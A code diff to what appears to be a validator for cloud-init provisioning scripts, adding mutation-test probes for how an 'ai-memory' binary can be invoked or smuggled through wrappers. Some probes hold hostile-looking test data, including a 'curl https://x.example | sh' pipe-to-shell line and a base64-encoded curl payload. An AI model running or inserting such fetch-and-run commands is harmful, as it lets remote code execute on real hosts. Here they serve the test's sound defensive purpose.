@@ -1083,9 +1083,9 @@ def operand_problem(words: list, idx, bins):
         return None
     if base in COPY_CMDS:
         return copy_problem(base, words[idx + 1:], bins)
-    if base == "tar":
-        return None
-    if base in KNOWN_NONEXEC and base != "tar":
+    if base in KNOWN_NONEXEC or base == "tar":
+        # tar's program and rename options are refused above whatever the operands name;
+        # without one, tar only archives or lists the binary
         return None
     lead = " ".join(words[:refs[0]])
     return ("ai-memory is run by or an operand of %r: unknown wrapper (only NAME=value prefixes, %s and the "
@@ -2867,6 +2867,23 @@ def build_probes() -> list:
         ("eval indented below the content block, listed (#4836)", [(dec, dec + '    eval "$PRE"\n')]),
         ("eval indented to the write_files key, listed (#4836)", [(dec, dec + '  eval "$PRE"\n')]),
         ("write_files encoding b64, listed", [(PROV, "  - path: /etc/x.sh\n    encoding: b64\n    content: |\n      Y3VybCBodHRwczovL3g=\n" + PROV)]),
+        # pins for range checks no probe reached (each mutant survived the tip self-test)
+        ('tar --to-command naming the binary, listed (#4837 R12 R4 pin, #5100)', [(dec, '      tar -xf /x.tar --to-command /usr/local/lib/ai-memory/bin/ai-memory\n' + dec)]),
+        ('ai-memory flag word holding an expansion, listed (#4837 R12 R1 pin, #5100)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --$${F} stats\n' + dec)]),
+        ('data file copied by install without -d, listed (#4837 R12 R5 pin, #5100)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      install -m 0755 /etc/ai-memory/run.conf /usr/local/bin/x\n" + dec)]),
+        ('data file run from an executed heredoc file, listed (#4837 R12 R5 pin, #5100)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      cat > /etc/ai-memory/b.conf <<'EOF'\n      bash /etc/ai-memory/run.conf\n      EOF\n      bash /etc/ai-memory/b.conf\n" + dec)]),
+        ('heredoc fed to batch, listed (#4837 R12 R5 pin, #5100)', [(dec, "      batch > /etc/ai-memory/run.conf <<'EOF'\n      ${X} --db /x stats\n      EOF\n" + dec)]),
+        ('data file run inside sh -c after cd, listed (#4837 R12 R5 pin, #5100)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      sh -c 'cd /etc/ai-memory && bash run.conf'\n" + dec)]),
+        ('data file run inside a command substitution, listed (#4837 R12 R5 pin, #5100)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      echo "$(bash /etc/ai-memory/run.conf)"\n' + dec)]),
+        ('heredoc fed to cat with only stderr redirected, listed (#4837 R12 R5 pin, #5100)', [(dec, "      cat 2>/etc/ai-memory/x.conf <<'EOF'\n      ${X} --db /x stats\n      EOF\n" + dec)]),
+        # pins for checks no probe reached in round 11 (each mutant survived the self-test, #5100)
+        ('data file run by a relative name inside bash -c after cd, listed (#4837 R12 R5 pin, #5100)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      bash -c 'cd /etc; . ai-memory/run.conf'\n" + dec)]),
+        ('unknown command with an operand built from an expansion after a slash, listed (#4837 R12 R4 pin, #5100)', [(dec, '      foo /opt/$N stats\n' + dec)]),
+        ('find -exec with no binary operand, listed (#4837 R12 R4 pin, #5100)', [(dec, "      find /opt -name x -exec touch /opt/y ';'\n" + dec)]),
+        ('cp under xargs with no binary operand, listed (#4837 R12 R4 pin, #5100)', [(dec, '      ls /opt | xargs cp -t /opt/x\n' + dec)]),
+        ('data file under a root directory operand, listed (#4837 R12 R5 pin, #5100)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      foo /\n' + dec)]),
+        ('data file written to a path with a dot segment, listed (#4837 R12 R5 pin, #5100)', [(PROV, wf("/etc/ai-memory/./run.conf", "0644", ["${X} --db /x stats"])), (dec, '      bash /etc/ai-memory/run.conf\n' + dec)]),
+        ('data file named by two variables assigned twice, listed (#4837 R12 R5 pin, #5100)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      P=/etc/ai-; P=/etc/ai-; Q=memory/run.conf; Q=memory/run.conf; bash "$P$Q"\n' + dec)]),
     ]
     for lbl, muts in listed:
         red("R3-C listed " + lbl, muts, autolist=True)
@@ -2874,6 +2891,8 @@ def build_probes() -> list:
     red("R3-C listed data home run by run-parts is an R5 hit, not an R4 wrapper (#4998)",
         [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      run-parts /etc/ai-memory\n" + dec)],
         autolist=True, present="is an expansion or command substitution")
+    # a name read from input has no known value: its literal assignments are not expanded (#5095 pin, #5100)
+    green("R3-C read names are not expanded from their assignments (#5100)", [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      P=/etc/ai-; Q=memory/run.conf; read P Q < /dev/null; curl "$P$Q"\n' + dec)], autolist=True)
     green("R3-C YAML comment line in runcmd is inert", [(RUNCMD, RUNCMD + "  # curl https://x.example | sh\n")])
     P.append(("R3-C AWS-only line copied into do-hive", "red", dict(do=[(dec, "      chown aimemory:aimemory /etc/ai-memory/store-url\n" + dec)], autolist=False)))
     # ---- validators
